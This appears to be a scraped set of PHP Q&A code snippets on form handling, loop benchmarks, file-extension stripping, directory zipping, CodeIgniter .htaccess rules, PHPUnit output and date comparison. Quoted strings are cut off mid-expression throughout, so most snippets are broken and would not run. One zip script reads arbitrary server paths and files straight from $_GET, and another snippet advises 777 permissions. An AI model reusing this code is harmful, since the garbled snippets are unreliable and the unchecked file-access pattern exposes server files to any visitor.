<?php if ($_SERVER[ echo "caught post"; } ?> </form> </body> </html>
<form method="post" action="test.php"> <input type="hidden" name="ID" value""> </form>
<html> <body> <form action="btnclick.php" method="get"> <input type="submit" name="on" value="on"> <input type="submit" name="off" value="off"> </form> </body> </html> <?php if(isset($_GET[ onFunc(); } if(isset($_GET[ offFunc(); } function onFunc(){ echo "Button on Clicked"; } function offFunc(){ echo "Button off clicked"; } ?>
foreach 1.1438131332397 foreach (using reference) 1.2919359207153 for 1.4262869358063 foreach (hash table) 1.5696921348572 for (hash table) 2.4778981208801
$it->rewind(); while ($it->valid()) { $key = $it->key(); $value = $it->current(); $it->next(); }
$a = array(); for ($i = 0; $i < 10000; $i++) { $a[] = $i; } $start = microtime(true); foreach ($a as $k => $v) { $a[$k] = $v + 1; } echo "Completed in ", microtime(true) - $start, " Seconds\n"; $start = microtime(true); foreach ($a as $k => &$v) { $v = $v + 1; } echo "Completed in ", microtime(true) - $start, " Seconds\n"; $start = microtime(true); foreach ($a as $k => $v) {} echo "Completed in ", microtime(true) - $start, " Seconds\n"; $start = microtime(true); foreach ($a as $k => &$v) {} echo "Completed in ", microtime(true) - $start, " Seconds\n";
Completed in 0.0073502063751221 Seconds Completed in 0.0019769668579102 Seconds Completed in 0.0011849403381348 Seconds Completed in 0.00111985206604 Seconds
$aHash1 = range( 0, 999999 ); $aHash2 = range( 0, 999999 ); shuffle( $aHash1 ); shuffle( $aHash2 ); $aHash = array_combine( $aHash1, $aHash2 ); $start1 = microtime(true); foreach($aHash as $key=>$val) $aHash[$key]++; $end1 = microtime(true); $start2 = microtime(true); while(list($key) = each($aHash)) $aHash[$key]++; $end2 = microtime(true); $start3 = microtime(true); $key = array_keys($aHash); $size = sizeOf($key); for ($i=0; $i<$size; $i++) $aHash[$key[$i]]++; $end3 = microtime(true); $start4 = microtime(true); foreach($aHash as &$val) $val++; $end4 = microtime(true); echo "foreach ".($end1 - $start1)."\n"; echo "while ".($end2 - $start2)."\n"; echo "for ".($end3 - $start3)."\n"; echo "foreach ref ".($end4 - $start4)."\n"; function noop( $value ) {} $bHash = range( 0, 999999 ); shuffle( $bHash ); $bstart1 = microtime(true); for($i = 0; $i < 1000000; ++$i) noop( $bHash[$i] ); $bend1 = microtime(true); $bstart2 = microtime(true); $i = 0; while($i < 1000000) { noop( $bHash[$i] ); ++$i; } $bend2 = microtime(true); $bstart3 = microtime(true); foreach( $bHash as $value ) { noop( $value ); } $bend3 = microtime(true); echo "for ".($bend1 - $bstart1)."\n"; echo "while ".($bend2 - $bstart2)."\n"; echo "foreach ".($bend3 - $bstart3)."\n";
global $application; $application->messageHandler->addMessage("Item successfully inserted");
$mh =&factory("messageHandler"); $mh->addMessage("Item successfully inserted");
class Application { protected static $_singletonFoo=NULL; public static function foo() { if(NULL === self::$_singletonFoo) { self::$_singletonFoo = new Foo; } return self::$_singletonFoo; } }
class Application { protected static $_singletonFoo=NULL; protected static $_helperName = public static function setDefaultHelperName($helperName= if(is_string($helperName)) { self::$_helperName = $helperName; } elseif(is_object($helperName)) { self::$_singletonFoo = $helperName; } else { return FALSE; } return TRUE; } public static function foo() { if(NULL === self::$_singletonFoo) { self::$_singletonFoo = new self::$_helperName; } return self::$_singletonFoo; } }
function app($class) { static $refs = array(); if (is_object($class)) { $refs[get_class($class)] = $class; $class = get_class($class); } if (!isset($refs[$class])) $refs[$class] = new $class(); return $refs[$class]; }
$object = load::singleton( $object = classname::instance();
$from=substr($from, 0, (strlen ($from)) - (strlen (strrchr($filename,
<?php $path_parts = pathinfo( echo $path_parts[ echo $path_parts[ echo $path_parts[ echo $path_parts[ ?>
$filename = "abc.def.jpg"; $newFileName = substr($filename, 0 , (strrpos($filename, ".")));
$filebroken = explode( $extension = array_pop($filebroken); $fileTypeless = implode(
$temp = explode( $ext = array_pop( $temp ); $name = implode(
$name = substr($filename, 0, (strlen ($filename)) - (strlen (strrchr($filename,
$info = pathinfo( $filename ); $name = $info[ $ext = $info[ $name = pathinfo( $filename )[
$image_name = "this-is.file.name.jpg"; $last_dot_index = strrpos($image_name, "."); $without_extention = substr($image_name, 0, $last_dot_index);
function string_pop($string, $delimiter){ $a = explode($delimiter, $string); array_pop($a); return implode($delimiter, $a); }
$filename = "pic.of.my.house.jpeg"; $name = string_pop($filename, echo $name;
pic.of.my.house (note it leaves valid, non-extension "." characters alone)
$filename = "image.jpg"; $e = explode(".", $filename); foreach($e as $key=>$d) { if($d!=end($e) { $new_d[]=$d; } } echo implode("-",$new_t);
function removeExt($path) { $basename = basename($path); return strpos($basename, } echo removeExt( echo removeExt( echo removeExt( echo removeExt(
$strng = "this string have lots of space . "; $strng = trim(preg_replace( echo $strng;
function secureRip(string $str): string { $arr = str_split($str, 1); $retStr = foreach ($arr as $char) { $retStr .= trim($char); } return $retStr; }
if ($a === $b) { throw new Exception( ); } ($a > $b) !== ($b > $a)
var_dump(true == "a"); var_dump("a" == 0); var_dump(true == 0);
var_dump(NAN <= "foo"); var_dump("foo" <= NAN); var_dump(NAN == "foo");
var_dump(new stdClass <= new DateTime); var_dump(new DateTime <= new stdClass);
var_dump(-INF < 0); var_dump(0 < TRUE); var_dump(-INF < TRUE);
var_dump(INF < []); var_dump([] < new stdClass); var_dump(new stdClass < INF);
sort(array("10", "1a", "2" )) => array("10", "1a", "2" ) sort(array("10", "2", "1a")) => array("1a", "2", "10") sort(array("1a", "10", "2" )) => array("2", "10", "1a") sort(array("1a", "2", "10")) => array("1a", "2", "10") sort(array("2", "10", "1a")) => array("2", "10", "1a") sort(array("2", "1a", "10")) => array("10", "1a", "2" )
home/ file1.html file2.html Another_Dir/ file8.html Sub_Dir/ file19.html
$aFiles = $this->da->getDirTree($target); /* $aFiles is something like, path => filetime Array ( [home] => [home/file1.html] => 1251280379 [home/file2.html] => 1251280377 etc... ) */ $zip = & new Zip(); foreach( $aFiles as $fileLocation => $time ){ $file = $target . "/" . $fileLocation; if ( is_file($file) ){ $buffer = file_get_contents($file); $zip->addFile($buffer, $fileLocation); } } THEN_SOME_PHP_CLASS::toDownloadData($zip);
function Zip($source, $destination) { if (!extension_loaded( return false; } $zip = new ZipArchive(); if (!$zip->open($destination, ZIPARCHIVE::CREATE)) { return false; } $source = str_replace( if (is_dir($source) === true) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST); foreach ($files as $file) { $file = str_replace( if( in_array(substr($file, strrpos($file, continue; $file = realpath($file); if (is_dir($file) === true) { $zip->addEmptyDir(str_replace($source . } else if (is_file($file) === true) { $zip->addFromString(str_replace($source . } } } else if (is_file($source) === true) { $zip->addFromString(basename($source), file_get_contents($source)); } return $zip->close(); }
class ExtendedZip extends ZipArchive { public function addTree($dirname, $localname = if ($localname) $this->addEmptyDir($localname); $this->_addTree($dirname, $localname); } protected function _addTree($dirname, $localname) { $dir = opendir($dirname); while ($filename = readdir($dir)) { if ($filename == continue; $path = $dirname . $localpath = $localname ? ($localname . if (is_dir($path)) { $this->addEmptyDir($localpath); $this->_addTree($path, $localpath); } else if (is_file($path)) { $this->addFile($path, $localpath); } } closedir($dir); } public static function zipTree($dirname, $zipFilename, $flags = 0, $localname = $zip = new self(); $zip->open($zipFilename, $flags); $zip->addTree($dirname, $localname); $zip->close(); } } ExtendedZip::zipTree(
maindirectory --- file 1 --- file 2 --- subdirectory 1 ------ file 3 ------ file 4 --- subdirectory 2 ------ file 5 ------ file 6
file 1 file 2 subdirectory 1 --- file 3 --- file 4 subdirectory 2 --- file 5 --- file 6
function Zip($source, $destination, $include_dir = false) { if (!extension_loaded( return false; } if (file_exists($destination)) { unlink ($destination); } $zip = new ZipArchive(); if (!$zip->open($destination, ZIPARCHIVE::CREATE)) { return false; } $source = str_replace( if (is_dir($source) === true) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST); if ($include_dir) { $arr = explode("/",$source); $maindir = $arr[count($arr)- 1]; $source = ""; for ($i=0; $i < count($arr) - 1; $i++) { $source .= } $source = substr($source, 1); $zip->addEmptyDir($maindir); } foreach ($files as $file) { $file = str_replace( if( in_array(substr($file, strrpos($file, continue; $file = realpath($file); if (is_dir($file) === true) { $zip->addEmptyDir(str_replace($source . } else if (is_file($file) === true) { $zip->addFromString(str_replace($source . } } } else if (is_file($source) === true) { $zip->addFromString(basename($source), file_get_contents($source)); } return $zip->close(); }
<?php $exclude_some_files= array( ); class ModifiedFlxZipArchive extends ZipArchive { public function addDirDoo($location, $name , $prohib_filenames=false) { if (!file_exists($location)) { die("maybe file/folder path incorrect");} $this->addEmptyDir($name); $name .= $location.= $dir = opendir ($location); while ($file = readdir($dir)){ if ($file == if (!in_array($name.$file,$prohib_filenames)){ if (filetype( $location . $file) == $this->addDirDoo($location . $file, $name . $file,$prohib_filenames ); } else { $this->addFile($location . $file, $name . $file); } } } } public function downld($zip_name){ ob_get_clean(); header("Pragma: public"); header("Expires: 0"); header("Cache-Control: must-revalidate, post-check=0, pre-check=0"); header("Cache-Control: private", false); header("Content-Type: application/zip"); header("Content-Disposition: attachment; filename=" . basename($zip_name) . ";" ); header("Content-Transfer-Encoding: binary"); header("Content-Length: " . filesize($zip_name)); readfile($zip_name); } } set_time_limit(3000); ini_set( ini_set( $new_zip_filename= if (isset($_GET[ $za = new ModifiedFlxZipArchive; if ($za->open($new_zip_filename, ZipArchive::CREATE)) { $za->addDirDoo($_GET[ }else {die( if (isset($_GET[ $za = new ModifiedFlxZipArchive; if ($za->open($new_zip_filename, ZipArchive::CREATE)) { $za->addDirDoo($_GET[ }else {die( header("location:?fildown=".$new_zip_filename); exit; } if (isset($_GET[ $za = new ModifiedFlxZipArchive; $za -> downld($_GET[ } ?>
/** Include the Pear Library for Zip */ include ( /** Create a Zipping Object... * Name of zip file to be created.. * You can specify the path too */ $obj = new Archive_Zip( /** * create a file array of Files to be Added in Zip */ $files = array( ); /** * creating zip file..if success do something else do something... * if Error in file creation ..it is either due to permission problem (Solution: give 777 to that folder) * Or Corruption of File Problem.. */ if ($obj->create($files)) { } else { } ?>; header( header( readfile( ?>;
function zip() { $source= $destination= $include_dir = false; $archive = if (!extension_loaded( return false; } if (file_exists($destination)) { unlink ($destination); } $zip = new ZipArchive; if (!$zip->open($archive, ZipArchive::CREATE)) { return false; } $source = str_replace( if (is_dir($source) === true) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST); if ($include_dir) { $arr = explode("/",$source); $maindir = $arr[count($arr)- 1]; $source = ""; for ($i=0; $i < count($arr) - 1; $i++) { $source .= } $source = substr($source, 1); $zip->addEmptyDir($maindir); } foreach ($files as $file) { $file = str_replace( if( in_array(substr($file, strrpos($file, continue; $file = realpath($file); if (is_dir($file) === true) { $zip->addEmptyDir(str_replace($source . } else if (is_file($file) === true) { $zip->addFromString(str_replace($source . } } } else if (is_file($source) === true) { $zip->addFromString(basename($source), file_get_contents($source)); } $zip->close(); header( header( header( readfile($archive); unlink($archive); }
function zipIt($source, $destination, $include_dir = false, $additionalIgnoreFiles = array()) { $defaultIgnoreFiles = array( $ignoreFiles = array_merge($defaultIgnoreFiles, $additionalIgnoreFiles); if (!extension_loaded( return false; } if (file_exists($destination)) { unlink ($destination); } $zip = new ZipArchive(); if (!$zip->open($destination, ZIPARCHIVE::CREATE)) { return false; } $source = str_replace( if (is_dir($source) === true) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST); if ($include_dir) { $arr = explode("/",$source); $maindir = $arr[count($arr)- 1]; $source = ""; for ($i=0; $i < count($arr) - 1; $i++) { $source .= } $source = substr($source, 1); $zip->addEmptyDir($maindir); } foreach ($files as $file) { $file = str_replace( if( in_array(substr($file, strrpos($file, continue; $file = realpath($file); if (is_dir($file) === true) { $zip->addEmptyDir(str_replace($source . } else if (is_file($file) === true) { $zip->addFromString(str_replace($source . } } } else if (is_file($source) === true) { $zip->addFromString(basename($source), file_get_contents($source)); } return $zip->close(); }
function Zip($source, $destination){ if (!extension_loaded( return false; } $zip = new ZipArchive(); if (!$zip->open($destination, ZIPARCHIVE::CREATE)) { return false; } $source = str_replace( if (is_dir($source) === true) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST); foreach ($files as $file) { $file = str_replace( if( in_array(substr($file, strrpos($file, continue; if (is_dir($file) === true) { $zip->addEmptyDir(str_replace($source . } else if (is_file($file) === true) { $str1 = str_replace($source . $zip->addFromString($str1, file_get_contents($file)); } } } else if (is_file($source) === true) { $zip->addFromString(basename($source), file_get_contents($source)); } return $zip->close(); }
function Zip($source, $destination) { if (!extension_loaded( return false; } $zip = new ZipArchive(); if (!$zip->open($destination, ZIPARCHIVE::CREATE)) { return false; } if (strtoupper(substr(PHP_OS, 0, 3)) === DEFINE( } else { DEFINE( } $source = str_replace( if (is_dir($source) === true) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST); echo $source; foreach ($files as $file) { $file = str_replace( if( in_array(substr($file, strrpos($file, DS)+1), array( continue; $file = realpath($file); if (is_dir($file) === true) { $zip->addEmptyDir(str_replace($source . DS, } else if (is_file($file) === true) { $zip->addFromString(str_replace($source . DS, } echo $source; } } else if (is_file($source) === true) { $zip->addFromString(basename($source), file_get_contents($source)); } return $zip->close(); }
function addFolderToZip($source, $destination, $flags = ZIPARCHIVE::OVERWRITE) { $source = realpath($source); $destination = realpath($destination); if (!file_exists($source)) { die("file does not exist: " . $source); } $zip = new ZipArchive(); if (!$zip->open($destination, $flags )) { die("Cannot open zip archive: " . $destination); } $files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST); $sourceWithSeparator = $source . DIRECTORY_SEPARATOR; foreach ($files as $file) { if(in_array(substr($file,strrpos($file, DIRECTORY_SEPARATOR)+1),array( continue; if (is_dir($file) === true) { $zip->addEmptyDir( str_replace($sourceWithSeparator, } else if (is_file($file) === true) { $zip->addFile($file, str_replace($sourceWithSeparator, } } return $zip->close(); }
function zip_r($from, $zip, $base=false) { if (!file_exists($from) OR !extension_loaded( if (!$base) {$base = $from;} $base = trim($base, $zip->addEmptyDir($base); $dir = opendir($from); while (false !== ($file = readdir($dir))) { if ($file == if (is_dir($from . zip_r($from . } else { $zip->addFile($from . } } return $zip; } $from = "/path/to/folder"; $base = "basezipfolder"; $zip = new ZipArchive(); $zip->open( $zip = zip_r($from, $zip, $base); $zip->close();
RewriteEngine on RewriteCond $1 !^(index\.php|[Javascript / CSS / Image root Folder name(s)]|robots\.txt) RewriteRule ^(.*)$ /index.php/$1 [L]
RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] <Files "index.php"> AcceptPathInfo On </Files>
RewriteRule ^(.*)$ /subofolder1/subfolder2/index.php/$1 [L]
RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L]
<VirtualHost *:80> ServerAdmin webmaster@localhost DocumentRoot /var/www <Directory /> Options FollowSymLinks AllowOverride All <---- replace None with All </Directory> <Directory /var/www > Options Indexes FollowSymLinks MultiViews AllowOverride All <--- replace None with All Order allow,deny allow from all </Directory> ...
RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule .* /codeigniter/index.php/$0 [PT,L]
RewriteEngine on RewriteBase /project/ RewriteCond $1 !^(index\.php|images|robots\.txt) RewriteRule ^(.*)$ /project/index.php/$1 [L]
RewriteEngine on RewriteBase / RewriteCond $1 !^(index\.php|images|robots\.txt) RewriteRule ^(.*)$ /index.php/$1 [L]
RewriteEngine on RewriteCond $1 !^(index\.php|resources|robots\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA]
RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule .* index.php/$0 [PT,L]
RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule .* index.php/$0 [PT,L]
RewriteEngine on RewriteCond $1 !^(index\.php|images|css|js|robots\.txt) RewriteRule ^(.*)$ /projectFolder/index.php/$1 [L]
RewriteEngine on RewriteCond $1 !^(index\.php|[assets/css/js/img]|robots\.txt) RewriteRule ^(.*)$ index.php/$1 [L]
RewriteEngine On RewriteBase / <Files .*> Order Deny,Allow Deny From All </Files> RewriteRule ^(?:application|system)\b.* index.php/$0 [L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule .* index.php/$0 [PT]
<IfModule mod_rewrite.c> RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] </IfModule>
RewriteEngine On RewriteBase / RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ /index.php/$1 [L]
RewriteEngine on RewriteCond $1 !^(index\\.php|resources|robots\\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA]
<Directory /var/www/> Options Indexes FollowSymLinks AllowOverride All Require all granted </Directory
DirectoryIndex index.php RewriteEngine on RewriteCond $1 !^(index\.php|(.*)\.swf|forums|images|css|downloads|jquery|js|robots \.txt|favicon\.ico) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ ./index.php?$1 [L,QSA]
RewriteEngine on RewriteRule ^(application|system|\.svn) index.php/$1 [L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [QSA,L]
RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] <Files "index.php"> AcceptPathInfo On </Files> <IfModule mod_php5.c> php_value short_open_tag 1 </IfModule>
RewriteEngine on RewriteBase / RewriteRule ^(application|system|\.svn) index.php/$1 [L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [QSA,L]
RewriteEngine on RewriteBase / RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ /folder/index.php?/$1 [L]
RewriteEngine on RewriteBase / RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ /folder/index.php?/$1 [L]
RewriteEngine on Options -Indexes RewriteCond $1 !^(index\.php|assets|robots\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA]
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase /Foldername of your ci/ RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] </IfModule>
Array ( [0] => Array ( [0] => 368 [1] => <?= [2] => 1 ) [1] => Array ( [0] => 309 [1] => $a [2] => 1 ) [2] => ; [3] => Array ( [0] => 369 [1] => ?> [2] => 1 ) )
$tokens = token_get_all( print_r($tokens); foreach($tokens as $token){ echo token_name((int) $token[0]), PHP_EOL; }
class theTest extends PHPUnit_Framework_TestCase { /** * @outputBuffering disabled */ public function testOutput() { print_r("Hello World"); print "Ping"; echo "Pong"; $out = "Foo"; var_dump($out); } }
PHPUnit @package_version@ by Sebastian Bergmann. . Time: 0 seconds, Memory: 3.00Mb OK (1 test, 0 assertions)
$ php -version PHP 5.2.9 (cli) (built: Dec 8 2010 11:36:37) Copyright (c) 1997-2009 The PHP Group Zend Engine v2.2.0, Copyright (c) 1998-2009 Zend Technologies with Xdebug v2.1.0, Copyright (c) 2002-2010, by Derick Rethans
class TestSomething extends PHPUnit_Framework_TestCase { function testSomething() { $myDebugVar = array(1, 2, 3); fwrite(STDERR, print_r($myDebugVar, TRUE)); } }
class theTest extends PHPUnit_Framework_TestCase { /** * @outputBuffering disabled */ public function testOutput() { $this->expectOutputString( print_r("Hello World"); print "Ping"; echo "Pong"; $out = "Foo"; var_dump($out); } }
PHPUnit @package_version@ by Sebastian Bergmann. F Time: 1 second, Memory: 3.50Mb There was 1 failure: 1) theTest::testOutput Failed asserting that two strings are equal. --- Expected +++ Actual @@ @@ - + +' FAILURES! Tests: 1, Assertions: 1, Failures: 1.
class TestHello extends PHPUnit_Framework_TestCase { public function test_Hello() { print "hello world"; } }
class yourTests extends PHPUnit_Framework_TestCase { protected function addWarning($msg, Exception $previous = null) { $add_warning = $this->getTestResultObject(); $msg = new PHPUnit_Framework_Warning($msg, 0, $previous); $add_warning->addWarning($this, $msg, time()); $this->setTestResultObject($add_warning); } protected function addError($msg, Exception $previous = null) { $add_error = $this->getTestResultObject(); $msg = new PHPUnit_Framework_AssertionFailedError($msg, 0, $previous); $add_error->addError($this, $msg, time()); $this->setTestResultObject($add_error); } protected function addFailure($msg, Exception $previous = null) { $add_failure = $this->getTestResultObject(); $msg = new PHPUnit_Framework_AssertionFailedError($msg, 0, $previous); $add_failure->addFailure($this, $msg, time()); $this->setTestResultObject($add_failure); } public function test_messages() { $this->addWarning("Your warning message!"); $this->addError("Your error message!"); $this->addFailure("Your Failure message"); } public function test_testMarking() { $this->markTestIncomplete(); $this->markTestSkipped(); } }
class ExampleTest extends TestCase{ public function test1() { $this->post( $this->dump(); } }
<?php class TemplateMethodsTest extends PHPUnit_Framework_TestCase { public static function setUpBeforeClass() { fwrite(STDOUT, __METHOD__ . "\n"); } protected function setUp() { fwrite(STDOUT, __METHOD__ . "\n"); } protected function assertPreConditions() { fwrite(STDOUT, __METHOD__ . "\n"); } public function testOne() { fwrite(STDOUT, __METHOD__ . "\n"); $this->assertTrue(TRUE); } public function testTwo() { fwrite(STDOUT, __METHOD__ . "\n"); $this->assertTrue(FALSE); } protected function assertPostConditions() { fwrite(STDOUT, __METHOD__ . "\n"); } protected function tearDown() { fwrite(STDOUT, __METHOD__ . "\n"); } public static function tearDownAfterClass() { fwrite(STDOUT, __METHOD__ . "\n"); } protected function onNotSuccessfulTest(Exception $e) { fwrite(STDOUT, __METHOD__ . "\n"); throw $e; } } ?>
class theTest extends PHPUnit_Framework_TestCase { public function testOutput() { throw new \Exception("hello"); } }
... There was 1 error: 1) theTest::testOutput Exception: hello
syslog(LOG_DEBUG, sprintf("%s: Value: %s", __METHOD__, var_export($_GET, TRUE)));
class TestCase extends \PHPUnit_Framework_TestCase { /** * Save last response * @var Response|null A Response instance */ static $lastResponse; /** * Modify to save response * * @param string $method * @param string $uri * @param array $parameters * @param array $files * @param array $server * @param string $content * @param bool $changeHistory * @return \Illuminate\Http\Response */ final public function call( $method, $uri, $parameters = [], $files = [], $server = [], $content = null, $changeHistory = true ) { $response = parent::call($method, $uri, $parameters, $files, $server, $content, $changeHistory); static::$lastResponse = $this->client->getResponse(); return $response; } /** * Modify message to add response text * * @param mixed $value * @param PHPUnit_Framework_Constraint $constraint * @param string $message * @since Method available since Release 3.0.0 */ final public static function assertThat($value, PHPUnit_Framework_Constraint $constraint, $message = { $message .= PHP_EOL . static::$lastResponse . PHP_EOL; parent::assertThat($value, $constraint, $message); } }
Eliminated run-time constant fetching for TRUE, FALSE and NULL author dmitry <dmitry> Wed, 15 Mar 2006 09:04:48 +0000 (09:04 +0000) committer dmitry <dmitry> Wed, 15 Mar 2006 09:04:48 +0000 (09:04 +0000) commit d51599dfcd3282049c7a91809bb83f665af23b69 tree 05b23b2f97cf59422ff71cc6a093e174dbdecbd3 parent a623645b6fd66c14f401bb2c9e4a302d767800fd
$foo = false; $bar = "false"; $foo2 = true; $bar2 = "true"; $foo3 = null; $bar3 = "null";
for ($i = 0; $i < self::ITERATIONS; ++$i) { (0 == FALSE) ; }
$blockLimit = 50; while($blockLimit > 0): $blockLimit--; $msc = microtime(true); for ($i = 0; $i < 100000; $i++) { echo (FALSE); } echo $msc = microtime(true); for ($i = 0; $i < 100000; $i++) { echo (false); } echo echo "\r\n --- \r\n"; endwhile;
<select name="taskOption"> <option>First</option> <option>Second</option> <option>Third</option> </select>
<select name="taskOption"> <option value="1">First</option> <option value="2">Second</option> <option value="3">Third</option> </select>
<form method="post" action="process.php"> <select name="taskOption"> <option value="first">First</option> <option value="second">Second</option> <option value="third">Third</option> </select> <input type="submit" value="Submit the form"/> </form>
<?php $option = isset($_POST[ if ($option) { echo htmlentities($_POST[ } else { echo "task option is required"; exit; }
<select name="taskOption"> <option value="first">First</option> <option value="second">Second</option> <option value="third">Third</option> </select> $var = $_POST[
<?php if(isset($_POST[ $select1 = $_POST[ switch ($select1) { case echo break; case echo break; default: break; } } ?> <form action="" method="post"> <select name="select1"> <option value="value1">Value 1</option> <option value="value2">Value 2</option> </select> <input type="submit" name="submit" value="Go"/> </form>
<select name="taskOption"> <option value="1">First</option> <option value="2">Second</option> <option value="3">Third</option> </select>
<?php if(isset($_POST[ $var = $_POST[ if($var == "1"){ echo"your data here"; } }?>
<select name= <option name= <option name= <option name= </select>
$city = (isset($_POST[ print("city is: ".$city[0]);
[PHP] extension_dir = "." extension=php_curl.dll extension=php_xxxx.dll ...
<?php $a = array(); $time = microtime(true); for($i=0;$i<10000;$i++) { if($a[$i] === null) { } } echo $time = microtime(true); for($i=0;$i<10000;$i++) { if(is_null($a[$i])) { } } echo ?>
$ php -a Interactive shell php > var_dump(is_null($a)); PHP Notice: Undefined variable: a in php shell code on line 1 bool(true) php > var_dump($a === null); PHP Notice: Undefined variable: a in php shell code on line 1 bool(true) php > var_dump(isset($a)); bool(false) php >
$a = array( var_dump(isset($a[ var_dump(is_null($a[ var_dump(array_key_exists(
Dear friends, I just wanted so Hello. How are you guys? I Greetings, Bill
Dear friends, I just wanted so Hello. How are you guys? I <br /> Greetings,<br /> Bill
Dear friends, I just wanted so Hello. How are you guys? I
$str = " Dear friends, I just wanted so Hello. How are you guys? I <br /> Greetings,<br /> Bill"; echo str_replace(array("\n", "\r"),
$string = str_replace(array("\r\n", "\r", "\n"), "<br />", $string);
$buffer = str_replace(array("\r\n", "\r", "\n"), "", $buffer);
function strip_carriage_returns($string) { return str_replace(array("\n\r", "\n", "\r"), }
parse_str($_SERVER[ print_r($_GET); /* outputs: Array( [var] => value [arg] => value ) */
export QUERY_STRING="var=value&arg=value" ; \ php -e -r
php-cgi -f index.php left=1058 right=1067 class=A language=English
Array ( [left] => 1058 [right] => 1067 [class] => A [language] => English )
<?php $_GET[ $_POST[ include("/somefolder/some_file_path.php");
if (php_sapi_name() == "cli") { for ($c = 1; $c < $argc; $c++) { $param = explode("=", $argv[$c], 2); $_GET[$param[0]] = $param[1]; } }
export QUERY_STRING="param1=abc&param2=xyz" ; POST_STRING="name=John&lastname=Doe" ; php -e -r $_POST); include "index.php";'
array(3) { ["script_php"]=> string(0) "" ["param1"]=> string(6) "blabla" ["param2"]=> string(8) "yadayada" }
$today = date("Y-m-d"); $expire = $row->expireDate if($today < $expireDate) {
$today = date("Y-m-d"); $expire = $row->expireDate; $today_time = strtotime($today); $expire_time = strtotime($expire); if ($expire_time < $today_time) { }
$today_dt = new DateTime($today); $expire_dt = new DateTime($expire); if ($expire_dt < $today_dt) { }
$today = new DateTime( $expireDate = new DateTime($row->expireDate); if($today->format("Y-m-d") < $expireDate->format("Y-m-d")) { }
SELECT IF(expireDate < NOW(),TRUE,FALSE) as isExpired FROM tableName
$today = date( $expireDate = new DateTime($row->expireDate); $date1=date_create($today); $date2=date_create($expireDate->format( $diff=date_diff($date1,$date2); $timeDiff = $diff->format("%R%a days"); echo $timeDiff; if($timeDiff < 0){ echo "Expired."; }else{ echo "Not expired."; }
$today_date=date("Y-m-d"); $entered_date=$_POST[ $dateTimestamp1 = strtotime($today_date); $dateTimestamp2 = strtotime($entered_date); $diff= $dateTimestamp1-$dateTimestamp2; if ($diff<=0) { echo "Enter a valid date"; }
$date_compare1= date("d-m-Y h:i:s a", strtotime($date1)); $date_compare2= date("d-m-Y h:i:s a", strtotime($date2)); $difference = strtotime($date_compare1) - strtotime($date_compare2); $difference_in_minutes = $difference / 60; echo $difference_in_minutes;
$date = new simpleDate(); echo $date->now()->compare($expire_date)->isBeforeOrEqual();
$today = date("Ymd"); $expire = str_replace( if(($today - $expire) > $NUMBER_OF_DAYS) { }
strtotime(date("Y"."-01-01")) -strtotime($newdate))/86400
if ($startdate < $date) { if ($startdate > $date) {
while ($row=mysql_fetch_array($result)) { $orderdate=explode( $date=$orderdate[0]; $month=$orderdate[1]; $year=$orderdate[2]; if((date(Y)>=$year) and (date(m)>=$month) and (date(d)>=$date)) { } else { }
$today = DateTime::createFromFormat( $wanted = DateTime::createFromFormat( $diff = $today->diff($wanted); $days = $diff->days; if (($diff->invert) != 0) $days = -1 * $days; $overdue = (($days < 0) ? true : false); print "<!-- (".(($days > 0) ?
